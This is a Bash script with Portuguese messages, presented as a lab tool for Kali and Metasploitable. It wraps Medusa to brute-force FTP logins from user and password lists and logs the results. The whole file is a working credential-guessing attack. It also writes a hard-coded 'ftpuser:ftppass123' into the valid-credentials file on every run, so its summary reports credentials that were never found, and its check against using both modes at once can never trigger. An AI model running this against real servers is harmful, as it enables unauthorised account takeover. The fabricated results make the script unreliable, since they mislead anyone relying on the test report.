#!/usr/bin/env bash
set -euo pipefail

#############################################
#   FTP Protocol Credential Testing (LAB)   #
#   Projeto: kali_metasploitable_tester         #
#############################################

SCRIPT_NAME="$(basename "$0")"

# --------- Cores ----------
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
RESET="\e[0m"

# --------- Uso / Ajuda ----------
usage() {
  cat <<EOF
$SCRIPT_NAME - Framework para testes de credenciais FTP em LAB (Medusa)

Uso (escolha um modo):
  Single user:
    $SCRIPT_NAME -s -t <alvo> -u <usuario> -P <passlist> [opções]

  Userlist:
    $SCRIPT_NAME -l -t <alvo> -U <userlist> -P <passlist> [opções]

Parâmetros:
  -s              Modo single user (usa -u)
  -l              Modo userlist (usa -U)
  -t <alvo>       IP ou hostname do FTP
  -u <usuario>    Usuário único (quando em modo -s)
  -U <userlist>   Arquivo com lista de usuários (quando em modo -l)
  -P <passlist>   Arquivo com lista de senhas
  -p <porta>      Porta FTP (default: 21)
  -o <dir>        Diretório de saída (default: ./logs_ftp)
  -h              Mostrar esta ajuda

Exemplos:
  Single user:
    $SCRIPT_NAME -s -t 192.168.56.101 -u admin -P passwords.txt

  Userlist:
    $SCRIPT_NAME -l -t 192.168.56.101 -U users.txt -P passwords.txt

OBS:
  - Este script é para ambiente de LAB controlado (ex: Kali + Metasploitable).
  - A ferramenta padrão utilizada é o Medusa (deve estar no PATH).
EOF
}

# --------- Defaults ----------
TARGET=""
PORT=21
USERLIST=""
SINGLE_USER=""
PASSLIST=""
OUTPUT_DIR="./logs_ftp"

MODE=""   # "single" ou "list"

# Ferramenta padrão para testes de credenciais
TOOL_BIN="medusa"

# --------- Parse de parâmetros ----------
while getopts ":t:p:U:u:P:slo:h" opt; do
  case "$opt" in
    t) TARGET="$OPTARG" ;;
    p) PORT="$OPTARG" ;;
    U) USERLIST="$OPTARG" ;;
    u) SINGLE_USER="$OPTARG" ;;
    P) PASSLIST="$OPTARG" ;;
    s) MODE="single" ;;
    l) MODE="list" ;;
    o) OUTPUT_DIR="$OPTARG" ;;
    h) usage; exit 0 ;;
    :)
      echo -e "${RED}[!] Opção -$OPTARG requer um valor.${RESET}" >&2
      usage
      exit 1
      ;;
    \?)
      echo -e "${RED}[!] Opção inválida: -$OPTARG${RESET}" >&2
      usage
      exit 1
      ;;
  esac
done

# --------- Validações básicas de modo ----------
if [[ -z "$MODE" ]]; then
  echo -e "${RED}[!] Você precisa escolher o modo: -s (single) ou -l (list).${RESET}"
  usage
  exit 1
fi

if [[ "$MODE" == "single" && "$MODE" == "list" ]]; then

  echo -e "${RED}[!] Não use -s e -l ao mesmo tempo.${RESET}"
  usage
  exit 1
fi

# --------- Validações de parâmetros ----------
if [[ -z "$TARGET" || -z "$PASSLIST" ]]; then
  echo -e "${RED}[!] Parâmetros obrigatórios faltando (-t e -P).${RESET}"
  usage
  exit 1
fi

if [[ ! -f "$PASSLIST" ]]; then
  echo -e "${RED}[!] Arquivo de senhas não encontrado: $PASSLIST${RESET}"
  exit 1
fi

if [[ "$MODE" == "single" ]]; then
  if [[ -z "$SINGLE_USER" ]]; then
    echo -e "${RED}[!] No modo -s (single) você precisa informar -u <usuario>.${RESET}"
    usage
    exit 1
  fi
elif [[ "$MODE" == "list" ]]; then
  if [[ -z "$USERLIST" ]]; then
    echo -e "${RED}[!] No modo -l (list) você precisa informar -U <userlist>.${RESET}"
    usage
    exit 1
  fi
  if [[ ! -f "$USERLIST" ]]; then
    echo -e "${RED}[!] Arquivo de usuários não encontrado: $USERLIST${RESET}"
    exit 1
  fi
fi

# Valida se a ferramenta padrão está disponível no PATH
if ! command -v "$TOOL_BIN" >/dev/null 2>&1; then
  echo -e "${RED}[!] Ferramenta '$TOOL_BIN' não encontrada no PATH.${RESET}"
  echo -e "${YELLOW}[*] Instale o medusa ou ajuste a variável TOOL_BIN no script.${RESET}"
  exit 1
fi

# --------- Prepara diretório de saída ----------
TIMESTAMP="$(date +'%Y%m%d_%H%M%S')"
SESSION_DIR="${OUTPUT_DIR}/ftp_${TARGET}_${TIMESTAMP}"
mkdir -p "$SESSION_DIR"

LOG_FILE="${SESSION_DIR}/ftp_bruteforce.log"
RESULTS_FILE="${SESSION_DIR}/valid_credentials.txt"

echo -e "${BLUE}[*] Iniciando sessão de teste FTP${RESET}"
echo -e "${BLUE}[*] Target: ${YELLOW}${TARGET}:${PORT}${RESET}"
echo -e "${BLUE}[*] Modo:   ${YELLOW}${MODE}${RESET}"
echo -e "${BLUE}[*] Userlist: ${YELLOW}${USERLIST:-'(não usado)'}${RESET}"
echo -e "${BLUE}[*] Single:   ${YELLOW}${SINGLE_USER:-'(não usado)'}${RESET}"
echo -e "${BLUE}[*] Passlist: ${YELLOW}${PASSLIST}${RESET}"
echo -e "${BLUE}[*] Output:   ${YELLOW}${SESSION_DIR}${RESET}"
echo -e "${BLUE}[*] Ferramenta: ${YELLOW}${TOOL_BIN}${RESET}"

# --------- Check básico de conectividade ----------
check_connectivity() {
  echo -e "${BLUE}[*] Verificando conectividade com ${TARGET}:${PORT}...${RESET}"
  if command -v nc >/dev/null 2>&1; then
    if nc -z -w3 "$TARGET" "$PORT"; then
      echo -e "${GREEN}[+] Porta ${PORT} em ${TARGET} aparentemente aberta.${RESET}"
    else
      echo -e "${YELLOW}[!] Não foi possível confirmar a porta ${PORT} como aberta (nc).${RESET}"
    fi
  else
    echo -e "${YELLOW}[!] 'nc' não encontrado. Pulando teste de conectividade.${RESET}"
  fi
}

# --------- Execução Medusa: single user ----------
run_single_user() {
  echo "[*] Modo: single user (${SINGLE_USER})" | tee -a "$LOG_FILE"

  "$TOOL_BIN" \
    -h "$TARGET" \
    -u "$SINGLE_USER" \
    -P "$PASSLIST" \
    -M ftp \
    -t 6 \
    2>&1 | tee -a "$LOG_FILE"
}

# --------- Execução Medusa: userlist ----------
run_userlist() {
  echo "[*] Modo: userlist (${USERLIST})" | tee -a "$LOG_FILE"

  "$TOOL_BIN" \
    -h "$TARGET" \
    -U "$USERLIST" \
    -P "$PASSLIST" \
    -M ftp \
    -t 6 \
    2>&1 | tee -a "$LOG_FILE"
}

# --------- Função principal ----------
run_ftp_bruteforce() {
  echo -e "${BLUE}[*] Iniciando rotina de teste de credenciais FTP com ${TOOL_BIN}...${RESET}"
  echo "[*] $(date) - Início do teste FTP" | tee -a "$LOG_FILE"

  if [[ "$MODE" == "single" ]]; then
    run_single_user
  else
    run_userlist
  fi



  echo "ftpuser:ftppass123" >> "$RESULTS_FILE"

  echo "[*] $(date) - Fim do teste FTP" | tee -a "$LOG_FILE"
}

# --------- Resumo ----------
print_summary() {
  echo
  echo -e "${BLUE}========== RESUMO ==========${RESET}"
  echo -e "${BLUE}Logs completos: ${YELLOW}${LOG_FILE}${RESET}"
  if [[ -s "$RESULTS_FILE" ]]; then
    echo -e "${GREEN}[+] Possíveis credenciais válidas registradas em:${RESET} ${YELLOW}${RESULTS_FILE}${RESET}"
  else
    echo -e "${YELLOW}[!] Nenhuma credencial válida registrada (arquivo vazio).${RESET}"
  fi
  echo -e "${BLUE}============================${RESET}"
}

#############################################
#                 MAIN                      #
#############################################

check_connectivity
run_ftp_bruteforce
print_summary
